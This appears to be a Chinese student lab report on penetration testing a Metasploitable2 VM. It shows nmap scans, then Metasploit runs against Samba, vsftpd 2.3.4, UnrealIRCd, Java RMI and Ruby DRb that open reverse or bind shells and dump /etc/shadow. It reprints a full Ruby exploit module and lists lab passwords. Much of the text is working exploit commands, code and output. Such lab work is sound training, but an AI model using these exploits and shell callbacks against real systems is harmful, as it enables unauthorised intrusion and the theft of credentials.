# 环境配置

## 1. `IP`信息

- 我的攻击机：`192.168.43.97`
- 我的靶机：`192.168.43.124`

<div style="page-break-after:always;"></div>

## 2. 组队信息

- 同组同学的姓名：`xxx`（`xxx`班，`U2019xxxxx`）
- 给同组同学靶机设置的`msfadmin`密码：`xba803`
- 给同组同学靶机设置的`root`密码：`xba237`

<div style="page-break-after:always;"></div>

# 攻击过程

## 3. 漏洞发现

### 3.1 主机扫描

- 使用`nmap`进行主机发现，扫描结果见`1.1-HostDiscovery.xml`：

```shell
# 使用 Ping 进行主机发现
# -sn: Ping Scan - disable port scan
[6:20:48] xubiang:EXP1 $ sudo nmap -sn 192.168.43.0/24 -oX 1.1-HostDiscovery.xml
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 06:22 EDT
Nmap scan report for 192.168.43.1
Host is up (0.012s latency).
MAC Address: 96:F4:64:EC:BB:30 (Unknown)
Nmap scan report for DESKTOP-08876S0 (192.168.43.23)
Host is up (0.013s latency).
MAC Address: 90:78:41:CE:D5:47 (Intel Corporate)
Nmap scan report for 192.168.43.38
Host is up (0.010s latency).
MAC Address: 90:78:41:CE:D5:47 (Intel Corporate)
Nmap scan report for 192.168.43.124
Host is up (0.0013s latency).
MAC Address: 00:0C:29:BE:4B:8B (VMware)
Nmap scan report for BIANG-LAPTOP (192.168.43.168)
Host is up (0.00061s latency).
MAC Address: 34:13:E8:96:DF:E8 (Intel Corporate)
Nmap scan report for kali (192.168.43.97)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 2.23 seconds
```

- 使用`Ping`进行主机发现后，搜索到的在线的`IP`有：`192.168.43.1`、`192.168.43.23`、`192.168.43.38`、`192.168.43.124`、`192.168.43.168`和`192.168.43.97`，已知`192.168.43.124`为自己的靶机、`192.168.43.168`为自己的主机和`192.168.43.97`为`Kali`虚拟机，根据主机名和`IP`判断`192.168.43.1`为网关、`192.168.43.23`为对方的主机，则此时仅剩的可能仅为`192.168.43.38`。当然，如果网络中有更多的主机，仅仅凭借推测很难找到目标靶机，可以采取以下的简单的端口扫描进一步确认靶机。
- 使用`nmap`进行简单的端口扫描，扫描结果见`1.2-HostDiscovery.xml`：

```
# 在网段内进行简单的端口扫描以进一步确定要攻击的主机
# -sS: TCP SYN scan
[6:23:01] xubiang:EXP1 $ sudo nmap -sS 192.168.43.0/24 -oX 1.2-HostDiscovery.xml
...
Nmap scan report for 192.168.43.38
Host is up (0.070s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 90:78:41:CE:D5:47 (Intel Corporate)
...
```

- 根据开启的端口数量可以确定，`192.168.43.38`即为靶机。

### 3.2 端口扫描、版本侦测和操作系统扫描

- 使用`nmap`进行端口扫描、版本侦测和操作系统扫描扫描，结果分别见`1.3-PortScanning.xml`及`1.4-PortScanning.xml`：

```shell
# 对靶机进行端口扫描、版本侦测和操作系统扫描扫描，并得到开启端口的服务/版本信息
# -Pn: Treat all hosts as online -- skip host discovery
# -sV: Probe open ports to determine service/version info
# -p <port ranges>: Only scan specified ports
[6:24:36] xubiang:EXP1 $ sudo nmap -Pn -sV 192.168.43.38 -p 1-65535 -oX 1.3-PortScanning.xml
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 06:24 EDT
Nmap scan report for 192.168.43.38
Host is up (0.0082s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec?
513/tcp   open  login?
514/tcp   open  shell?
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36972/tcp open  java-rmi    GNU Classpath grmiregistry
42191/tcp open  mountd      1-3 (RPC #100005)
44157/tcp open  nlockmgr    1-4 (RPC #100021)
48066/tcp open  status      1 (RPC #100024)
MAC Address: 90:78:41:CE:D5:47 (Intel Corporate)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.48 seconds

# 获得更详细的信息
# -A: Enable OS detection, version detection, script scanning, and traceroute
# -T<0-5>: Set timing template (higher is faster)
# --min-parallelism/max-parallelism <numprobes>: Probe parallelization
# --open: Only show open (or possibly open) ports
[6:27:30] xubiang:EXP1 $ sudo nmap -Pn -A -T4 --open --min-parallelism 64 192.168.43.38 -p- -oX 1.4-PortScanning.xml
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 06:27 EDT
Nmap scan report for 192.168.43.38
Host is up (0.0084s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.43.97
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2022-04-27T10:30:55+00:00; +1s from scanner time.
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      41720/udp   mountd
|   100005  1,2,3      42191/tcp   mountd
|   100021  1,3,4      44157/tcp   nlockmgr
|   100021  1,3,4      58446/udp   nlockmgr
|   100024  1          36467/udp   status
|_  100024  1          48066/tcp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec?
513/tcp   open  login?
514/tcp   open  shell?
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, LongColumnFlag, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsCompression, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: WZ>hov&SQz44HK"bL3YI
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2022-04-27T10:30:55+00:00; +2s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
| irc-info: 
|   users: 2
|   servers: 1
|   lusers: 2
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:09:01
|   source ident: nmap
|   source host: Test-B025CB0A
|_  error: Closing Link: sgxdkbgqy[kali] (Quit: sgxdkbgqy)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36972/tcp open  java-rmi    GNU Classpath grmiregistry
42191/tcp open  mountd      1-3 (RPC #100005)
44157/tcp open  nlockmgr    1-4 (RPC #100021)
48066/tcp open  status      1 (RPC #100024)
MAC Address: 90:78:41:CE:D5:47 (Intel Corporate)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2022-04-27T06:30:47-04:00
|_clock-skew: mean: 1h00m02s, deviation: 2h00m01s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   8.43 ms 192.168.43.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.69 seconds
```

### 3.3 漏洞发现

- 根据以上的端口扫描和版本侦测结果，可以发现靶机运行了`ftp`、`ssh`、`telnet`、`smtp`、`http`等服务，其中很有可能存在相应的漏洞：可以尝试在搜索引擎搜索相应软件的相应版本是否存在漏洞；也可以在`nmap`的脚本库中使用相应的漏洞扫描脚本对特定服务进行扫描，以发现某服务的漏洞；还可以直接在`metasploit`中查找相关软件存在的漏洞扫描和漏洞利用脚本并进行尝试以确定是否存在可以使用的漏洞；或使用`kali`下的`searchsploit`寻找相关漏洞。
- 使用以上方法，可以发现靶机上存在着众多的漏洞，如`vsftpd 2.3.4`的笑脸漏洞（[`CVE-2011-2523`](https://security-tracker.debian.org/tracker/CVE-2011-2523)）、`Samba`的`usermap_script`漏洞（[`CVE-2007-2447`](https://security-tracker.debian.org/tracker/CVE-2007-2447)）、`UnrealIRCd`的后门漏洞（[`CVE-2010-2075`](https://security-tracker.debian.org/tracker/CVE-2010-2075)）等，也存在很多弱口令（`ssh`、`telnet`）甚至无口令（`mysql`，`bindshell`）的服务。其中有些漏洞利用可以获得用户权限，有些可以获得`root`权限。由于该实验任务为获得`/etc/shadow`文件，因此需要获得`root`权限，以下仅列出经测试可以获得`root`权限的漏洞利用。

![3.3.1-ftp](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081635114.png)

![3.3.2-sambd](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081635948.png)

![3.3.3-unrealircd](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081635429.png)

![3.3.4.JAVA RMI](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081831029.png)

<div style="page-break-after:always;"></div>

## 4 漏洞利用

- 以下为经过测试可以获得`root`权限的漏洞利用。
- 流量包`samba.pcap`包含完整的扫描和攻击流程，使用了`samba`漏洞；其他漏洞的使用仅提供了漏洞利用过程，未保存流量包。
- 注：在使用`samba`漏洞时，攻击机`kali`的`IP`为`192.168.43.97`；使用其他漏洞时，攻击机`kali`的`IP`变成了`192.168.43.98`。

### 4.1 软件漏洞/后门类

#### 4.1.1 `Samba`

```bash
[6:31:00] xubiang:EXP1 $ msfconsole
                                                  
...

msf6 > search samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
...

   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution

...

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOST 192.168.43.38
RHOST => 192.168.43.38
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 192.168.43.97:4444 
[*] Command shell session 1 opened (192.168.43.97:4444 -> 192.168.43.38:42770 ) at 2022-04-27 06:33:20 -0400

id
uid=0(root) gid=0(root)
cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.2-samba](https://raw.githubusercontent.com/BIIIANG/pic/main/202205072359129.png)

#### 4.1.2 `FTP`

- 扫描漏洞：

```shell
[4:04:58] xubiang:EXP1 $ ls /usr/share/nmap/scripts | grep vsftpd            
ftp-vsftpd-backdoor.nse
[4:05:11] xubiang:EXP1 $ nmap -script ftp-vsftpd-backdoor -p 21 192.168.43.38
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 04:05 EDT
Nmap scan report for 192.168.43.38
Host is up (0.083s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://www.securityfocus.com/bid/48539
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523

Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds
```

![4.2.1-扫描](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081609622.png)

- 利用漏洞：

```shell
[4:05:43] xubiang:EXP1 $ msfconsole

...

msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.43.38
RHOST => 192.168.43.38
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.43.38:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.43.38:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.43.38:21 - The port used by the backdoor bind listener is already open
[+] 192.168.43.38:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
id
[*] Command shell session 1 opened (192.168.43.98:42447 -> 192.168.43.38:6200 ) at 2022-05-08 04:07:06 -0400

uid=0(root) gid=0(root)
cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.2.2-攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081610572.png)

#### 4.1.3 `UnrealIRC`

- 漏洞扫描：

```shell
[4:12:33] xubiang:~ $ ls /usr/share/nmap/scripts | grep unrealircd
irc-unrealircd-backdoor.nse
[4:12:36] xubiang:~ $ nmap -script irc-unrealircd-backdoor -p 6667,6697 192.168.43.38
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 04:13 EDT
Nmap scan report for 192.168.43.38
Host is up (0.069s latency).

PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
6697/tcp open  ircs-u
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277

Nmap done: 1 IP address (1 host up) scanned in 21.03 seconds
```

![4.3.1-扫描](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081626957.png)

- 漏洞利用：

```shell
[4:19:24] xubiang:EXP1 $ msfconsole                                                
                                                  
...

msf6 > search unreal

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Linux)
   1  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 "secure" Overflow (Win32)
   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 > use unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.43.38
RHOST => 192.168.43.38
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.43.98
LHOST => 192.168.43.98
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP handler on 192.168.43.98:4444 
[*] 192.168.43.38:6667 - Connected to 192.168.43.38:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Found your hostname (cached)
[*] 192.168.43.38:6667 - Sending backdoor command...
id
[*] Command shell session 1 opened (192.168.43.98:4444 -> 192.168.43.38:38145 ) at 2022-05-08 04:20:46 -0400

uid=0(root) gid=0(root)
cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.3.2-攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081626811.png)

#### 4.1.4 `java-rmi`

- 漏洞扫描：

```shell
msf6 > use auxiliary/scanner/misc/java_rmi_server
msf6 auxiliary(scanner/misc/java_rmi_server) > set RHOSTS 192.168.43.38
RHOSTS => 192.168.43.38
msf6 auxiliary(scanner/misc/java_rmi_server) > run

[+] 192.168.43.38:1099    - 192.168.43.38:1099 Java RMI Endpoint Detected: Class Loader Enabled
[*] 192.168.43.38:1099    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

![4.4.1](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081828724.png)

- 漏洞利用：

```
[6:23:26] xubiang:EXP1 $ msfconsole 

...

msf6 > use exploit/multi/misc/java_rmi_server
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.43.38
RHOSTS => 192.168.43.38
msf6 exploit(multi/misc/java_rmi_server) > set HTTPDELAY 20
HTTPDELAY => 20
msf6 exploit(multi/misc/java_rmi_server) > exploit 

[*] Started reverse TCP handler on 192.168.43.98:4444 
[*] 192.168.43.38:1099 - Using URL: http://0.0.0.0:8080/CuRwGg0
[*] 192.168.43.38:1099 - Local IP: http://192.168.43.98:8080/CuRwGg0
[*] 192.168.43.38:1099 - Server started.
[*] 192.168.43.38:1099 - Sending RMI Header...
[*] 192.168.43.38:1099 - Sending RMI Call...
[*] 192.168.43.38:1099 - Replied to request for payload JAR
[*] Sending stage (58053 bytes) to 192.168.43.38
[*] Sending stage (58053 bytes) to 192.168.43.38
[*] Meterpreter session 1 opened (192.168.43.98:4444 -> 192.168.43.38:51999 ) at 2022-05-08 06:25:04 -0400
[*] Meterpreter session 2 opened (192.168.43.98:4444 -> 192.168.43.38:47399 ) at 2022-05-08 06:25:04 -0400
[*] 192.168.43.38:1099 - Server stopped.

meterpreter > shell
Process 1 created.
Channel 1 created.
id
uid=0(root) gid=0(root)
cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
msfadmin:$1$FKo1UCia$KxgF2WmQNsKY2lC3nPp4n/:19107:0:99999:7:::
...
```

![4.4.2](https://raw.githubusercontent.com/BIIIANG/pic/main/202205081828310.png)

#### 4.1.5 `Ruby DRb RMI`

- 脚本准备：在搜索到该漏洞后，尝试在`metasploit`中搜索相应脚本`drb_remote_codeexec`，却发现网页资料中所提供的脚本不存在，且`metasploit`中没有其他相应漏洞的脚本，因此在`github`找到了脚本的源文件[`drb_remote_codeexec.rb`](https://github.com/rapid7/metasploit-framework/blob/ba17a5d67fc9c2faecde66aaac21b7c976605060/modules/exploits/linux/misc/drb_remote_codeexec.rb)如下，但已经于`2020-11-2`从[`metasploit-framework`](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/linux/misc/drb_remote_codeexec.rb)中移除了，获得其历史版本并将其放置在`~/.msf4/modules/exploits`下，并在`metasploit`中`reload_all`，即可搜索并使用该脚本：

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'drb/drb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Distributed Ruby Remote Code Execution',
        'Description' => %q{
          This module exploits remote code execution vulnerabilities in dRuby.
        },
        'Author' => [ 'joernchen <joernchen[at]phenoelit.de>' ], # (Phenoelit)
        'License' => MSF_LICENSE,
        'References' =>
          [
            [ 'URL', 'http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html' ],
            [ 'URL', 'http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/' ],
            [ 'URL', 'http://bugkraut.de/posts/tainting' ]
          ],
        'Privileged' => false,
        'Payload' =>
          {
            'DisableNops' => true,
            'Space' => 32768
          },
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [
          ['Automatic', { method: 'auto' }],
          ['Trap', { method: 'trap' }],
          ['Eval', { method: 'instance_eval' }],
          ['Syscall', { method: 'syscall' }],
        ],
        'DisclosureDate' => '2011-03-23',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(8787)
      ]
    )
  end

  def method_trap(p)
    p.send(:trap, 23,
           :"class Object\ndef my_eval(str)\nsystem(str.untaint)\nend\nend")
    # Decide if this is running on an x86 or x64 target, using the kill(2) syscall
    begin
      pid = p.send(:syscall, 20)
      p.send(:syscall, 37, pid, 23)
    rescue Errno::EBADF
      # 64 bit system
      pid = p.send(:syscall, 39)
      p.send(:syscall, 62, pid, 23)
    end
    p.send(:my_eval, payload.encoded)
  end

  def method_instance_eval(p)
    p.send(:instance_eval, "Kernel.fork { `#{payload.encoded}` }")
  end

  def method_syscall(p)
    filename = '.' + Rex::Text.rand_text_alphanumeric(16)

    begin
      # Decide if this is running on an x86 or x64 target.
      # This syscall number is getpid on x86, which will succeed,
      # or writev on x64, which will fail due to missing args.
      j = p.send(:syscall, 20)
      # syscall open
      i = p.send(:syscall, 8, filename, 0o700)
      # syscall write
      p.send(:syscall, 4, i, "#!/bin/sh\n#{payload.encoded}\n", payload.encoded.length + 11)
      # syscall close
      p.send(:syscall, 6, i)
      # syscall fork
      p.send(:syscall, 2)
      sleep 2
      # syscall execve
      p.send(:syscall, 11, filename, 0, 0)
      print_status("attempting x86 execve of #{filename}")

    # likely x64
    rescue Errno::EBADF
      # syscall creat
      i = p.send(:syscall, 85, filename, 0o700)
      # syscall write
      p.send(:syscall, 1, i, "#!/bin/sh\n#{payload.encoded}\n", payload.encoded.length + 11)
      # syscall close
      p.send(:syscall, 3, i)
      # syscall fork
      p.send(:syscall, 57)
      sleep 2
      # syscall execve
      p.send(:syscall, 59, filename, 0, 0)
      print_status("attempting x64 execve of #{filename}")
    end

    register_file_for_cleanup(filename) if filename
  end

  def rhost
    datastore['RHOST']
  end

  def check
    begin
      pid = p.send(:syscall, 20)
    rescue Errno::EBADF
      # 64 bit system
      pid = p.send(:syscall, 39)
    rescue SecurityError, DRb::DRbConnError, NoMethodError
      return CheckCode::Safe
    end
    vprint_status("Service detected, syscall responded from pid #{pid}")

    val1 = rand(0xffff)
    val2 = rand(0xffff)
    begin
      result = p.send(:instance_eval, "#{val1} + #{val2}")
    rescue SecurityError, DRb::DRbConnError, NoMethodError
    end

    return CheckCode::Vulnerable if result == val1 + val2

    CheckCode::Detected
  end

  def exploit
    serveruri = "druby://#{datastore['RHOST']}:#{datastore['RPORT']}"

    # DRb.start_service  # this is unnecessary
    p = DRbObject.new_with_uri(serveruri)
    class << p
      undef :send
    end

    if target[:method] == 'auto'
      methods = %w[instance_eval syscall trap]
    else
      methods = [target[:method]]
    end

    methods.each do |method|
      begin
        print_status("Trying to exploit #{method} method")
        send('method_' + method, p)
        handler(nil)
        break
      rescue SecurityError, DRb::DRbConnError, NoMethodError
        print_warning("Target is not vulnerable to #{method} method")
      end
    end

  end
end
```

- 漏洞利用：

```
[7:17:19] xubiang:EXP1 $ msfconsole 
                                                  
...

msf6 > use exploit/drb_remote_codeexec
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(drb_remote_codeexec) > set RHOSTS 192.168.43.38
RHOSTS => 192.168.43.38
msf6 exploit(drb_remote_codeexec) > exploit 

[*] Started reverse TCP handler on 192.168.43.98:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Trying to exploit instance_eval method
[!] Target is not vulnerable to instance_eval method
[*] Trying to exploit syscall method
[!] Target is not vulnerable to syscall method
[*] Trying to exploit trap method
[!] Target is not vulnerable to trap method
[*] Command shell session 1 opened (192.168.43.98:4444 -> 192.168.43.38:37341 ) at 2022-05-08 07:18:11 -0400

id
uid=0(root) gid=0(root)
[-] Command shell session 2 is not valid and will be closed
[*] 192.168.43.38 - Command shell session 2 closed.
cat /etc/shadow
root:$1$7DSzfpME$3a45316tWZF9TZWi48eub/:19107:0:99999:7:::
...
